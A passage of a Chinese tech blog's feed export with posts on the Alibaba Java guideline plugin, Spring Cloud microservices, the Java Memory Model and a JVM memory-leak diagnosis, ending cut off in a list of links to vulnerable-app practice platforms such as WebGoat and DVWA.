plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Help &gt;&gt; Install New Software</div></pre></td></tr></table></figure><p>然后输入<a href="https://p3c.alibaba.com/plugin/eclipse/update" target="_blank" rel="external">https://p3c.alibaba.com/plugin/eclipse/update</a> 即可看到安装列表，安装即可。<br>插件的更新，可以通过 Help &gt;&gt; Check for Udates 进行新版本检测。</p><h3 id="怎么用"><a href="#怎么用" class="headerlink" title="怎么用"></a>怎么用</h3><p><img src="http://upload-images.jianshu.io/upload_images/2830896-1911d3bf3eaaa16f?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="IDea"><br><img src="http://upload-images.jianshu.io/upload_images/2830896-2debd0505d66e61b?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="IDea"><br><img src="http://upload-images.jianshu.io/upload_images/2830896-59d3710547be75a7?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="IDea"></p><p>还有自动提示的效果</p><p><img src="http://upload-images.jianshu.io/upload_images/2830896-9467b7a4d9073b0c?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="IDea"><br>可以说是非常棒了</p><p><img src="http://upload-images.jianshu.io/upload_images/2830896-e4a8c0354cc62ff7?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="IDea"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;就在今天 10月14日上午9：00 阿里巴巴于在杭州云栖大会《研发效能峰会》上，正式发布《阿里巴巴Java开发手册》扫描插件，该插件在扫描代码后，将不符合《手册》的代码按Blocker/Critical/Major三个等级显示在下方，甚至在IDEA上，还基于Inspecti
      
    
    </summary>
    
      <category term="后端" scheme="http://yoursite.com/categories/%E5%90%8E%E7%AB%AF/"/>
    
    
      <category term="插件" scheme="http://yoursite.com/tags/%E6%8F%92%E4%BB%B6/"/>
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>2017天猫双11，1682亿背后的阿里绝密50+技术</title>
    <link href="http://yoursite.com/2017/11/01/2017%E5%A4%A9%E7%8C%AB%E5%8F%8C11%EF%BC%8C1682%E4%BA%BF%E8%83%8C%E5%90%8E%E7%9A%84%E9%98%BF%E9%87%8C%E7%BB%9D%E5%AF%8650+%E6%8A%80%E6%9C%AF/"/>
    <id>http://yoursite.com/2017/11/01/2017天猫双11，1682亿背后的阿里绝密50+技术/</id>
    <published>2017-11-01T14:43:56.000Z</published>
    <updated>2017-11-12T12:09:35.122Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Spring-Cloud概述"><a href="#Spring-Cloud概述" class="headerlink" title="Spring Cloud概述"></a>Spring Cloud概述</h3><h4 id="传统的应用"><a href="#传统的应用" class="headerlink" title="传统的应用"></a>传统的应用</h4><p>1.单体应用<br>在此之前，笔者所在公司开发Java程序，大都使用Struts、Spring、Hibernate（MyBatis）等技术框架，每一个项目都会发布一个单体应用。例如开发一个进销存系统，将会开发一个war包部署到Tomcat中，每一次需要开发新的模块或添加新功能时，都会在原来的基础上不断的添加。若干年后，这个war包不断的膨胀，程序员在进行调试时，服务器也可能需要启动半天，维护这个系统的效率极为低下。这样一个war包，涵盖了库存、销售、会员、报表等模块，如图1-1。<br><img src="https://static.oschina.net/uploads/space/2017/0924/095718_XMPj_3665821.png" alt="图1-1 单体应用"><br>这样的单体应用隐患非常多，任何的一个bug，都有可能导致整个系统宕机。笔者印象最深刻的是，曾经有一客户在高峰期，导出一张销售明细报表（数据量较大），最终造成整个系统瘫痪，前台的销售人员无法售卖。维护这样一个系统，不仅效率极低，而且充满风险，项目组的各个成员惶惶不可终日，我们需要本质上的改变。</p><p>2.架构演进<br>针对以上的单体应用的问题，我们参考SOA架构，将各个模块划分独立的服务模块（war），并且使用了数据库的读写分离，架构如图1-2。<br><img src="https://static.oschina.net/uploads/space/2017/0924/095730_JNIO_3665821.png" alt="图1-2 架构演进"><br>各个模块之间会存在相互调用的依赖关系，例如销售模块会调用会员模块的接口，为了减少各个模块之间的耦合，我们加入了企业服务总线（ESB），各模块与ESB之间的架构如图1-3所示。<br><img src="https://static.oschina.net/uploads/space/2017/0924/095740_2lFc_3665821.png" alt="图1-2 架构演进"><br>加入ESB后，各个模块将服务发布到ESB中，它们与ESB之间使用SOAP协议进行通信。图1-2与图1-3的架构实现后，整个系统的性能有了明显的提升，各个模块的耦合度也降低了。运行了一段日子后，又出现了新的问题，由于销售终端数量的增多，销售模块明显超过其承受能力，为了保证销售前端的正常运行，我们使用了Nginx做负载均衡，请见图1-4。<br><img src="https://static.oschina.net/uploads/space/2017/0924/095748_jOP0_3665821.png" alt="图1-3 ESB"><br>加入ESB后，各个模块将服务发布到ESB中，它们与ESB之间使用SOAP协议进行通信。图1-2与图1-3的架构实现后，整个系统的性能有了明显的提升，各个模块的耦合度也降低了。运行了一段日子后，又出现了新的问题，由于销售终端数量的增多，销售模块明显超过其承受能力，为了保证销售前端的正常运行，我们使用了Nginx做负载均衡，请见图1-4。<br><img src="https://static.oschina.net/uploads/space/2017/0924/095748_jOP0_3665821.png" alt="图1-4 使用Nginx"><br>随着销售模块的增多，带来了许多问题，例如管理这些模块，对于运维工程师来说，是一项艰巨的任务，一旦销售模块有所修改，他们将通宵达旦进行升级。另外，企业服务总线也有可能成为性能的瓶颈，虽然目前仍未出现该问题，但我们需要未雨绸缪。</p><p>3.架构要求<br>从前面的架构演进可知，应用中的每一个点，都有可能成为系统的问题点。随着互联网应用的普及，在大数据、高并发的环境下，我们的系统架构需要面对更为严苛的挑战，我们需要一套新的架构，它起码能满足以下要求<br>高性能：这是应用程序的基本要求。</p><ul><li>独立性：其中一个模块出现bug或者其他问题，不可以影响其他模块或者整个应用。</li><li>容易扩展：应用中的每一个节点，都可以根据实际需要进行扩展。</li><li>便于管理：对于各个模块的资源，可以轻松进行管理、升级，减少维护成本。</li><li>状态监控与警报：对整个应用程序进行监控，当某一个节点出现问题时，能及时发出警报。</li></ul><p>为了能解决遇到的问题、达到以上的架构要求，我们开始研究Spring Cloud。</p><h4 id="微服务与Spring-Cloud"><a href="#微服务与Spring-Cloud" class="headerlink" title="微服务与Spring Cloud"></a>微服务与Spring Cloud</h4><p>1.什么是微服务<br>微服务一词来源Martin Fowler的“Microservices”一文，微服务是一种架构风格，将单体应用划分为小型的服务单元，微服务之间使用HTTP的API进行资源访问与操作。</p><p>在对单体应用的划分上，微服务与前面的SOA架构有点类似，但是SOA架构侧重于将每个单体应用的服务集成到ESB上，而微服务做得更加彻底，强调将整个模块变成服务组件，微服务对模块的划分粒度可能会更细。以我们前面的销售、会员模块为例，在SOA架构中，只需要将相应的服务发布到ESB容器就可以了，而在微服务架构中，这两个模块本身，将会变为一个或多个的服务组件。SOA架构与微服务架构，请见图1-5与图1-6。</p><p><img src="https://static.oschina.net/uploads/space/2017/0924/095758_YXOu_3665821.png" alt="图1-5 SOA架构"></p><p><img src="https://static.oschina.net/uploads/space/2017/0924/095810_5ep4_3665821.png" alt="图1-6 微服务架构"></p><p>在微服务的架构上，Martin Fowler的文章肯定了Netflix的贡献，接下来，我们了解一下Netflix OSS。</p><ol><li>关于Netflix OSS<br>Netflix是一个互联网影片提供商，在几年前，Netflix公司成立了自己的开源中心，名称为Netflix Open Source Software Center，简称Netflix OSS。这个开源组织专注于大数据、云计算方面的技术，提供了多个开源框架，这些框架包括大数据工具、构建工具、基于云平台的服务工具等。Netflix所提供的这些框架，很好的遵循微服务所推崇的理念，实现了去中心化的服务管理、服务容错等机制。</li></ol><p>3.Spring Cloud与Netflix<br>Spring Cloud并不是一个具体的框架，大家可以把它理解为一个工具箱，它提供的各类工具，可以帮助我们快速的构建分布式系统。</p><p>Spring Cloud的各个项目基于Spring Boot，将Netflix的多个框架进行封装，并且通过自动配置的方式将这些框架绑定到Spring的环境中，从而简化了这些框架的使用。由于Spring Boot的简便，使得我们在使用Spring Cloud时，很容易的将Netflix各个框架整合进我们的项目中。Spring Cloud下的“Spring Cloud Netflix”模块，主要封装了Netflix的以下项目：<br>Eureka：基于REST服务的分布式中间件，主要用于服务管理。</p><ul><li>Hystrix：容错框架，通过添加延迟阀值以及容错的逻辑，来帮助我们控制分布式系统间组件的交互。</li><li>Feign：一个REST客户端，目的是为了简化Web Service客户端的开发</li><li>Ribbon：负载均衡框架，在微服务集群中为各个客户端的通信提供支持，它主要实现中间层应用程序的负载均衡</li><li>Zuul：为微服务集群提供过代理、过滤、路由等功能。</li></ul><p>4.Spring Cloud的主要模块</p><p>除了Spring Cloud Netflix模块外，Spring Cloud还包括以下几个重要的模块：</p><ul><li>Spring Cloud Config：为分布式系统提供了配置服务器和配置客户端，通过对它们的配置，可以很好的管理集群中的配置文件。</li><li>Spring Cloud Sleuth：服务跟踪框架，可以与Zipkin、Apache HTrace和ELK等数据分析、服务跟踪系统进行整合，为服务跟踪、解决问题提供了便利。</li><li>Spring Cloud Stream：用于构建消息驱动微服务的框架，该框架在Spring Boot的基础上，整合了“Spring Integration”来连接消息代理中间件。</li><li>Spring Cloud Bus：连接RabbitMQ、Kafka等消息代理的集群消息总线。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Spring-Cloud概述&quot;&gt;&lt;a href=&quot;#Spring-Cloud概述&quot; class=&quot;headerlink&quot; title=&quot;Spring Cloud概述&quot;&gt;&lt;/a&gt;Spring Cloud概述&lt;/h3&gt;&lt;h4 id=&quot;传统的应用&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
      <category term="其他" scheme="http://yoursite.com/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="其他" scheme="http://yoursite.com/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>深入理解Java内存模型</title>
    <link href="http://yoursite.com/2017/09/12/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Java%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B/"/>
    <id>http://yoursite.com/2017/09/12/深入理解Java内存模型/</id>
    <published>2017-09-12T12:38:11.000Z</published>
    <updated>2017-11-29T15:08:51.991Z</updated>
    
    <content type="html"><![CDATA[<p>Java内存模型即Java Memory Model，简称JMM。JMM定义了Java 虚拟机(JVM)在计算机内存(RAM)中的工作方式。JVM是整个计算机虚拟模型，所以JMM是隶属于JVM的。</p><h3 id="并发编程模型的分类"><a href="#并发编程模型的分类" class="headerlink" title="并发编程模型的分类"></a>并发编程模型的分类</h3><p>在并发编程中，我们需要处理两个关键问题：线程之间如何通信及线程之间如何同步。<br>这里的线程是指并发执行的活动实体，通信是指线程之间以何种机制来交换信息。</p><p>在命令式编程中，线程之间的通信机制有两种：<strong>共享内存和消息传递。</strong><br>在共享内存的并发模型里，线程之间共享程序的公共状态，线程之间通过写-读内存中的公共状态来隐式进行通信。<br>在消息传递的并发模型里，线程之间没有公共状态，线程之间必须通过明确的发送消息来显式进行通信。</p><p>同步是指程序用于控制不同线程之间操作发生相对顺序的机制。在共享内存并发模型里，同步是显式进行的。程序员必须显式指定某个方法或某段代码需要在线程之间互斥执行。<br>在消息传递的并发模型里，由于消息的发送必须在消息的接收之前，因此同步是隐式进行的。</p><p><strong>Java的并发采用的是共享内存模型</strong><br>Java线程之间的通信总是隐式进行，整个通信过程对程序员完全透明。</p><h3 id="java内存模型三个特性"><a href="#java内存模型三个特性" class="headerlink" title="java内存模型三个特性"></a>java内存模型三个特性</h3><p>Java内存模型有三个特性：原子性、可见性、有序性。<br>这个三个特性主要体现在多线程环境下对变量的操作。这些变量包括：实例字段、静态字段、构成数组对象的元素。这些变量都保存在堆中，<br>堆是线程共享的。那么这些变量在多线程环境下就有可能出现所谓“线程不安全”的问题。 另，局部变量和方法参数是线程私有的，保存在栈中，不会出现线程安全问题。</p><blockquote><p><strong>原子性 : </strong>表明此操作是不可分割的，不可中断，要全部执行，要么全部不执行。<br>.<br><strong>可见性 : </strong>一个线程对某一共享变量修改之后，另一个线程要立即获取到修改后的结果。<br>.<br><strong>有序性 : </strong>在单线程环境下，程序永远会“有序的”执行，即：线程内表现为串行语义。</p></blockquote><h3 id="Java内存模型的抽象"><a href="#Java内存模型的抽象" class="headerlink" title="Java内存模型的抽象"></a>Java内存模型的抽象</h3><p>在Java中，所有实例域、静态域和数组元素存储在堆内存中，堆内存在线程之间共享。</p><p>局部变量，方法定义参数和异常处理器参数不会在线程之间共享，不会出现线程安全问题，也不受内存模型的影响。</p><p><strong>Java线程之间的通信由Java内存模型（本文简称为JMM）控制，JMM决定一个线程对共享变量的写入何时对另一个线程可见。</strong></p><p>从抽象的角度来看，JMM定义了线程和主内存之间的抽象关系：线程之间的共享变量存储在主内存（main memory）中，每个线程都有一个私有的本地内存（local memory），本地内存中存储了该线程以读/写共享变量的副本</p><blockquote><p><strong>本地内存 : </strong> 是JMM的一个抽象概念，并不真实存在。它涵盖了缓存，写缓冲区，寄存器以及其他的硬件和编译器优化</p></blockquote><p><img src="http://img.blog.csdn.net/20160921182337904" alt="这里写图片描述"></p><p>从上图来看，线程A与线程B之间如要通信的话，必须要经历下面2个步骤：</p><blockquote><ol><li>首先，线程A把本地内存A中更新过的共享变量刷新到主内存中去。</li><li>然后，线程B到主内存中去读取线程A之前已更新过的共享变量。</li></ol></blockquote><p><img src="http://img.blog.csdn.net/20160921182748551" alt="这里写图片描述"></p><p>从整体来看，这两个步骤实质上是线程A在向线程B发送消息，而且这个通信过程必须要经过主内存。JMM通过控制主内存与每个线程的本地内存之间的交互，来为java程序员提供内存可见性保证。</p><p>上面也说到了，Java内存模型只是一个抽象概念，那么它在Java中具体是怎么工作的呢？为了更好的理解上Java内存模型工作方式，下面就JVM对Java内存模型的实现、硬件内存模型及它们之间的桥接做详细介绍。</p><h3 id="JVM对Java内存模型的实现"><a href="#JVM对Java内存模型的实现" class="headerlink" title="JVM对Java内存模型的实现"></a>JVM对Java内存模型的实现</h3><p>在JVM内部，Java内存模型把内存分成了两部分：线程栈区和堆区，下图展示了Java内存模型在JVM中的逻辑视图： </p><p><img src="http://img.blog.csdn.net/20160921182837697" alt="这里写图片描述"></p><blockquote><p><strong>线程栈 : </strong> JVM中运行的每个线程都拥有自己的线程栈，线程栈包含了当前线程执行的方法调用相关信息，我们也把它称作调用栈。随着代码的不断执行，调用栈会不断变化。<br>线程栈还包含了当前方法的所有本地变量信息。<strong>一个线程只能读取自己的线程栈</strong>，也就是说，线程中的本地变量对其它线程是不可见的。即使两个线程执行的是同一段代码，它们也会各自在自己的线程栈中创建本地变量，因此，每个线程中的本地变量都会有自己的版本。<br>所有原始类型(boolean,byte,short,char,int,long,float,double)的本地变量都直接保存在线程栈当中，对于它们的值各个线程之间都是独立的。<br>对于原始类型的本地变量，一个线程可以传递一个副本给另一个线程，当它们之间是无法共享的。</p></blockquote><p>..</p><blockquote><p><strong>堆 </strong> : 堆区包含了Java应用创建的所有对象信息，不管对象是哪个线程创建的，其中的对象包括原始类型的封装类（如Byte、Integer、Long等等）。不管对象是属于一个成员变量还是方法中的本地变量，它都会被存储在堆区。</p></blockquote><p>下图展示了调用栈和本地变量都存储在栈区，对象都存储在堆区： </p><p><img src="http://img.blog.csdn.net/20160921182903818" alt="这里写图片描述"></p><p>一个本地变量如果是原始类型，那么它会被完全存储到栈区。<br>一个本地变量也有可能是一个对象的引用，这种情况下，这个本地引用会被存储到栈中，但是对象本身仍然存储在堆区。</p><p>对于一个对象的成员方法，这些方法中包含本地变量，仍需要存储在栈区，即使它们所属的对象在堆区。<br>对于一个对象的成员变量，不管它是原始类型还是包装类型，都会被存储到堆区。</p><p>Static类型的变量以及类本身相关信息都会随着类本身存储在堆区。<br>堆中的对象可以被多线程共享。如果一个线程获得一个对象的应用，它便可访问这个对象的成员变量。如果两个线程同时调用了同一个对象的同一个方法，那么这两个线程便可同时访问这个对象的成员变量，但是对于本地变量，每个线程都会拷贝一份到自己的线程栈中。</p><p><img src="http://img.blog.csdn.net/20160921182948601" alt="这里写图片描述"></p><h3 id="硬件内存架构"><a href="#硬件内存架构" class="headerlink" title="硬件内存架构"></a>硬件内存架构</h3><p>不管是什么内存模型，最终还是运行在计算机硬件上的，所以我们有必要了解计算机硬件内存架构，下图就简单描述了当代计算机硬件内存架构： </p><p><img src="http://img.blog.csdn.net/20160921183013570" alt="这里写图片描述"></p><p>不管是什么内存模型，最终还是运行在计算机硬件上的，所以我们有必要了解计算机硬件内存架构，下图就简单描述了当代计算机硬件内存架构：<br>这里写图片描述</p><p>现代计算机一般都有2个以上CPU，而且每个CPU还有可能包含多个核心。因此，如果我们的应用是多线程的话，这些线程可能会在各个CPU核心中并行运行。</p><p>在CPU内部有一组CPU寄存器，也就是CPU的储存器。CPU操作寄存器的速度要比操作计算机主存快的多。在主存和CPU寄存器之间还存在一个CPU缓存，CPU操作CPU缓存的速度快于主存但慢于CPU寄存器。某些CPU可能有多个缓存层（一级缓存和二级缓存）。计算机的主存也称作RAM，所有的CPU都能够访问主存，而且主存比上面提到的缓存和寄存器大很多。</p><p>当一个CPU需要访问主存时，会先读取一部分主存数据到CPU缓存，进而在读取CPU缓存到寄存器。当CPU需要写数据到主存时，同样会先flush寄存器到CPU缓存，然后再在某些节点把缓存数据flush到主存。</p><h3 id="Java内存模型和硬件架构之间的桥接"><a href="#Java内存模型和硬件架构之间的桥接" class="headerlink" title="Java内存模型和硬件架构之间的桥接"></a>Java内存模型和硬件架构之间的桥接</h3><p>正如上面讲到的，Java内存模型和硬件内存架构并不一致。硬件内存架构中并没有区分栈和堆，从硬件上看，不管是栈还是堆，大部分数据都会存到主存中，当然一部分栈和堆的数据也有可能会存到CPU寄存器中，如下图所示，Java内存模型和计算机硬件内存架构是一个交叉关系：<br><img src="http://img.blog.csdn.net/20160921183144995" alt="这里写图片描述"></p><p>当对象和变量存储到计算机的各个内存区域时，必然会面临一些问题，其中最主要的两个问题是：</p><blockquote><ol><li>共享对象对各个线程的可见性</li><li>共享对象的竞争现象</li></ol></blockquote><h4 id="共享对象的可见性"><a href="#共享对象的可见性" class="headerlink" title="共享对象的可见性"></a>共享对象的可见性</h4><p>当多个线程同时操作同一个共享对象时，如果没有合理的使用volatile和synchronization关键字，一个线程对共享对象的更新有可能导致其它线程不可见。</p><p>想象一下我们的共享对象存储在主存，一个CPU中的线程读取主存数据到CPU缓存，然后对共享对象做了更改，但CPU缓存中的更改后的对象还没有flush到主存，此时线程对共享对象的更改对其它CPU中的线程是不可见的。最终就是每个线程最终都会拷贝共享对象，而且拷贝的对象位于不同的CPU缓存中。</p><p><img src="http://img.blog.csdn.net/20160921183218651" alt="这里写图片描述"></p><p>要解决共享对象可见性这个问题，我们可以使用java volatile关键字。 Java’s volatile keyword. volatile 关键字可以保证变量会直接从主存读取，而对变量的更新也会直接写到主存。volatile原理是基于CPU内存屏障指令实现的。</p><h4 id="竞争现象"><a href="#竞争现象" class="headerlink" title="竞争现象"></a>竞争现象</h4><p>如果多个线程共享一个对象，如果它们同时修改这个共享对象，这就产生了竞争现象。</p><p>如下图所示，线程A和线程B共享一个对象obj。假设线程A从主存读取Obj.count变量到自己的CPU缓存，同时，线程B也读取了Obj.count变量到它的CPU缓存，并且这两个线程都对Obj.count做了加1操作。此时，Obj.count加1操作被执行了两次，不过都在不同的CPU缓存中。</p><p>如果这两个加1操作是串行执行的，那么Obj.count变量便会在原始值上加2，最终主存中的Obj.count的值会是3。然而下图中两个加1操作是并行的，不管是线程A还是线程B先flush计算结果到主存，最终主存中的Obj.count只会增加1次变成2，尽管一共有两次加1操作</p><p><img src="http://img.blog.csdn.net/20160921183251870" alt="这里写图片描述"></p><p>要解决上面的问题我们可以使用java synchronized代码块。synchronized代码块可以保证同一个时刻只能有一个线程进入代码竞争区，synchronized代码块也能保证代码块中所有变量都将会从主存中读，当线程退出代码块时，对所有变量的更新将会flush到主存，不管这些变量是不是volatile类型的。</p><p><strong> volatile和synchronized区别 </strong></p><ul><li>volatile本质是在告诉jvm当前变量在寄存器（工作内存）中的值是不确定的，需要从主存中读取； synchronized则是锁定当前变量，只有当前线程可以访问该变量，其他线程被阻塞住。</li><li>volatile仅能使用在变量级别；synchronized则可以使用在变量、方法、和类级别的</li><li>volatile仅能实现变量的修改可见性，不能保证原子性；而synchronized则可以保证变量的修改可见性和原子性</li><li>volatile不会造成线程的阻塞；synchronized可能会造成线程的阻塞。</li><li>volatile标记的变量不会被编译器优化；synchronized标记的变量可以被编译器优化</li></ul><p><strong> 对于volatile关键字，当且仅当满足以下所有条件时可使用 </strong></p><ul><li>变量的写入操作不依赖变量的当前值，或者你能确保只有单个线程更新变量的值。</li><li>该变量没有包含在具有其他变量的不变式中。</li></ul><h3 id="支撑Java内存模型的基础原理"><a href="#支撑Java内存模型的基础原理" class="headerlink" title="支撑Java内存模型的基础原理"></a>支撑Java内存模型的基础原理</h3><h4 id="指令重排序"><a href="#指令重排序" class="headerlink" title="指令重排序"></a>指令重排序</h4><p>在执行程序时，为了提高性能，编译器和处理器会对指令做重排序。但是，JMM确保在不同的编译器和不同的处理器平台之上，通过插入特定类型的Memory Barrier来禁止特定类型的编译器重排序和处理器重排序，为上层提供一致的内存可见性保证。</p><ul><li>编译器优化重排序：编译器在不改变单线程程序语义的前提下，可以重新安排语句的执行顺序。</li><li>指令级并行的重排序：如果不存l在数据依赖性，处理器可以改变语句对应机器指令的执行顺序。</li><li>内存系统的重排序：处理器使用缓存和读写缓冲区，这使得加载和存储操作看上去可能是在乱序执行。</li></ul><p><strong>数据依赖性</strong></p><p>如果两个操作访问同一个变量，其中一个为写操作，此时这两个操作之间存在数据依赖性。<br>编译器和处理器不会改变存在数据依赖性关系的两个操作的执行顺序，即不会重排序。</p><p><strong>as-if-serial</strong></p><p>不管怎么重排序，单线程下的执行结果不能被改变，编译器、runtime和处理器都必须遵守as-if-serial语义。</p><h4 id="内存屏障（Memory-Barrier-）"><a href="#内存屏障（Memory-Barrier-）" class="headerlink" title="内存屏障（Memory Barrier ）"></a>内存屏障（Memory Barrier ）</h4><p>通过内存屏障可以禁止特定类型处理器的重排序，从而让程序按我们预想的流程去执行。内存屏障，又称内存栅栏，是一个CPU指令，基本上它是一条这样的指令：</p><ul><li>保证特定操作的执行顺序。</li><li>影响某些数据（或则是某条指令的执行结果）的内存可见性。</li></ul><p>编译器和CPU能够重排序指令，保证最终相同的结果，尝试优化性能。插入一条Memory Barrier会告诉编译器和CPU：不管什么指令都不能和这条Memory Barrier指令重排序。<br>Memory Barrier所做的另外一件事是强制刷出各种CPU cache，如一个Write-Barrier（写入屏障）将刷出所有在Barrier之前写入 cache 的数据，因此，任何CPU上的线程都能读取到这些数据的最新版本。</p><p>上面讲到的volatile是基于Memory Barrier实现的。</p><p>如果一个变量是volatile修饰的，JMM会在写入这个字段之后插进一个Write-Barrier指令，并在读这个字段之前插入一个Read-Barrier指令。这意味着，如果写入一个volatile变量，就可以保证：</p><ul><li>一个线程写入变量a后，任何线程访问该变量都会拿到最新值。</li><li>在写入变量a之前的写入操作，其更新的数据对于其他线程也是可见的。因为Memory Barrier会刷出cache中的所有先前的写入。</li></ul><h4 id="happens-before"><a href="#happens-before" class="headerlink" title="happens-before"></a>happens-before</h4><p>从jdk5开始，java使用新的JSR-133内存模型，基于happens-before的概念来阐述操作之间的内存可见性。<br>在JMM中，如果一个操作的执行结果需要对另一个操作可见，那么这两个操作之间必须要存在happens-before关系，这个的两个操作既可以在同一个线程，也可以在不同的两个线程中。</p><p>与程序员密切相关的happens-before规则如下：</p><ul><li>程序顺序规则：一个线程中的每个操作，happens-before于该线程中任意的后续操作。</li><li>监视器锁规则：对一个锁的解锁操作，happens-before于随后对这个锁的加锁操作。</li><li>volatile域规则：对一个volatile域的写操作，happens-before于任意线程后续对这个volatile域的读。</li><li>传递性规则：如果 A happens-before B，且 B happens-before C，那么A happens-before C。</li></ul><p>注意：两个操作之间具有happens-before关系，并不意味前一个操作必须要在后一个操作之前执行！仅仅要求前一个操作的执行结果，对于后一个操作是可见的，且前一个操作按顺序排在后一个操作之前。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Java内存模型即Java Memory Model，简称JMM。JMM定义了Java 虚拟机(JVM)在计算机内存(RAM)中的工作方式。JVM是整个计算机虚拟模型，所以JMM是隶属于JVM的。&lt;/p&gt;
&lt;h3 id=&quot;并发编程模型的分类&quot;&gt;&lt;a href=&quot;#并发编程模
      
    
    </summary>
    
      <category term="后端" scheme="http://yoursite.com/categories/%E5%90%8E%E7%AB%AF/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="JVM" scheme="http://yoursite.com/tags/JVM/"/>
    
  </entry>
  
  <entry>
    <title>Java性能调优随记</title>
    <link href="http://yoursite.com/2017/09/03/Java%E6%80%A7%E8%83%BD%E8%B0%83%E4%BC%98%E9%9A%8F%E8%AE%B0/"/>
    <id>http://yoursite.com/2017/09/03/Java性能调优随记/</id>
    <published>2017-09-03T09:41:37.000Z</published>
    <updated>2018-01-16T16:44:15.744Z</updated>
    
    <content type="html"><![CDATA[<p>事情发生在16年了。当时系统beta版本进行上线前的性能压测时，发现进程的内存占用率会持续升高，与之而来的时，性能的接口性能的持续下降。最奇怪的是，停止压测后CPU和内存开销并没有恢复过来。记得之前发过博文，不知道怎么回事找不到了。 应其他同事的要求，回忆一下当时的定位过程，再做一个简单分享。<br>在讲述整个过程前，请大家自备两个梯子：<br>1)Java虚拟机的垃圾回收机制<br>2)jmeter的基本使用知识</p><p>首先下载jmeter工具，感觉是一个轻量级的性能检测工具，很好用。有基于windows 的GUI版本，也有在linux上运行的命令行版本。<br>下载地址：<a href="http://jmeter.apache.org/download_jmeter.cgi" target="_blank" rel="external">http://jmeter.apache.org/download_jmeter.cgi</a></p><p>怪象简述<br>刚开始压测时，一切指标都是正常的，也达到了预期水平。<br><img src="https://yqfile.alicdn.com/d68a2baf560215bcbf654489328695c3aca91d76.png" alt="Github"><br>8小时后，性能直线下降。<br><img src="https://yqfile.alicdn.com/2824338ce1f4e454c7e46d2edf22af7f7b1efbdc.png" alt="Github"><br>停止压测后，CPU和内存，仍然居高不下。 不要小看 2.4%的内存占用，这是200多G内存的物理服务器。（后面部署方式已切换为虚拟机的部署方式）<br><img src="https://yqfile.alicdn.com/7ec0340ae5296cc1f690656974add8ea82cc0a3c.png" alt="Github"><br>定位解决<br>1) 首先命令行，看下java堆的情况：jmap -heap 24442<br>看见年老区的内存被占满了<br><img src="https://yqfile.alicdn.com/44e00eddb0bbd82e988038652c3276a52da80be1.png" alt="Github"><br>2) 继续执行命令：jsat –gcutil 24442 1000 5，<br>看见年老区 使用率 100%，同时执行了12304次 FullGC<br><img src="https://yqfile.alicdn.com/27faf3175cf3f30ca3f04b21ef88a699f7851643.png" alt="Github"><br>3）查看进程24442的线程信息： ps –mp 24442 –o THREAD,tid,time<br>发现很多线程运行了好几个小时<br><img src="https://yqfile.alicdn.com/3e4e149b1563c6bc1aec5f10ec1efbc0e6faefbd.png" alt="Github"></p><p>这个时候，明显怀疑有内存泄露了。<br>再执行了两个命令（时间太久，没有找到截图了）：<br>jstat -printcompilation -h3 24442<br>jmap -histo 24442</p><p>进一步发现，内存中某个类的实例数量和String类的实例数量，异常的多。<br>最后在排查代码，找到了具体的类 及其使用逻辑。发现是由于队列的使用不当，造成了内存泄露</p><p>总结<br>本项目中，因为涉及频繁的小IO，所以开发同事期望通过生产者－队列－消费者的模型，用批量IO解决频繁小IO带来的资源开销。但在使用此模型时，忘计考虑了极限状态下，生产者的输入能力远大于消费者的消费能力时，会造成队列中的数据积压，进而造成内存泄露。但又因为常规情况下不会出现 此场景，所以很难发现这个bug。<br>这个案例告诉我们：<br>1) 对于一些关键接口，开发同事可以在完成开发后，自己用Jmeter压测一下，避免问题遗留到上线前期，造成巨大风险。<br>2) Java仍然会有内存泄露的情况，使用类似数组、队列、栈等数据结构时，需要格外小心。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;事情发生在16年了。当时系统beta版本进行上线前的性能压测时，发现进程的内存占用率会持续升高，与之而来的时，性能的接口性能的持续下降。最奇怪的是，停止压测后CPU和内存开销并没有恢复过来。记得之前发过博文，不知道怎么回事找不到了。 应其他同事的要求，回忆一下当时的定位过程
      
    
    </summary>
    
      <category term="后端" scheme="http://yoursite.com/categories/%E5%90%8E%E7%AB%AF/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Github 安全类Repo收集整理</title>
    <link href="http://yoursite.com/2017/06/10/Github%20%E5%AE%89%E5%85%A8%E7%B1%BBRepo%E6%94%B6%E9%9B%86%E6%95%B4%E7%90%86/"/>
    <id>http://yoursite.com/2017/06/10/Github 安全类Repo收集整理/</id>
    <published>2017-06-10T02:12:00.000Z</published>
    <updated>2018-01-16T16:06:55.353Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏洞及渗透练习平台"><a href="#漏洞及渗透练习平台" class="headerlink" title="漏洞及渗透练习平台"></a>漏洞及渗透练习平台</h3><ul><li><strong>WebGoat漏洞练习环境</strong><ul><li><a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="external">https://github.com/WebGoat/WebGoat</a></li><li><a href="https://github.com/WebGoat/WebGoat-Legacy" target="_blank" rel="external">https://github.com/WebGoat/WebGoat-Legacy</a></li></ul></li><li><strong>Damn Vulnerable Web Application(漏洞练习平台)</strong><ul><li><a href="https://github.com/RandomStorm/DVWA" target="_blank" rel="external">https://github.com/RandomStorm/DVWA</a></li></ul></li><li><strong>数据库注入练习平台</strong><ul><li><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a></li></ul></li><li><strong>用node编写的漏洞练习平台，like 